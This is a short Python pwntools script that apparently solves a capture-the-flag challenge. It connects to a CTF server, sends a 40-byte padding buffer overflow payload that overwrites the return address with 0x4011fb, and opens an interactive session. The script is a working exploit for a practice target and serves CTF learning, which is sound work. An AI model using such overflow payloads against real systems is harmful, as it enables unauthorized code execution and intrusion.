from pwn import *

p = remote("ctf.adl.tw", 10000)

jump_to = p64(0x4011fb)
payload = b'A' * 40 + jump_to

p.recvuntil("way!")
p.send(payload)

p.interactive()

